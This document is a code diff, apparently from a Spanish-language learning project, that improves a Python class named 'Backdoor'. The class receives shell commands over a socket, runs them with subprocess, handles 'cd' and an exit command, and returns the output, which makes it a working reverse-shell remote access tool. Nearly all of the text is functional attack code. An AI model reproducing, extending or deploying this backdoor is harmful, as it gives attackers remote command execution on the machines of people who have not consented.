@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import json
+import os
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -9,12 +10,21 @@ class Backdoor:
 
     #Codificación json:
     def reliableSend(self, data):
-        jsonData = json.dumps(data.decode('utf-8'))
+        if isinstance(data, bytes):
+            jsonData = json.dumps(data.decode('utf-8', 'replace'))            
+        else:
+            jsonData = json.dumps(data)
+
         self.connection.send(bytes(jsonData, 'utf-8'))
 
     #Decodificación json:
     def reliableRecieve(self):
         jsonData = ''
+        '''
+        Al usar un bucle, la función de recibir datos se ejecuta una y otra vez.
+        De esta manera nos aseguramos de que todos los paquetes sean recividos, evitando que se pierda alguno.
+        Así aseguramos la integridad de los mismos.
+        '''
         while True:
             try:
                 jsonData = self.connection.recv(1024)
@@ -23,13 +33,27 @@ class Backdoor:
             except ValueError: continue
     
     def runCommand(self, command):
-        return subprocess.check_output(command, shell=True)
+        try:
+            return subprocess.check_output(command, shell=True)
+        except subprocess.CalledProcessError:
+            return 'Comado no reconocido o error en el valor de salida'
 
+    def changeDirectory(self, path):
+        os.chdir(path)
+        return f'[+] Cambiando a {path}'
+    
     def run(self):
         try:
             while True: #Permite al programa ejecutarse indefinidamente
                 command = self.reliableRecieve() #Recibe toda la información que le enviemos(En este caso, comandos de consola)
-                commandResults = self.runCommand(command)
+                if command[0] == 'salir' or command[0] == 'Salir':
+                    self.connection.close()
+                    exit()
+
+                elif command[0] == 'cd' and len(command) > 1:
+                    commandResults = self.changeDirectory(command[1])
+
+                else: commandResults = self.runCommand(command)
                 self.reliableSend(commandResults)
 
         except KeyboardInterrupt:
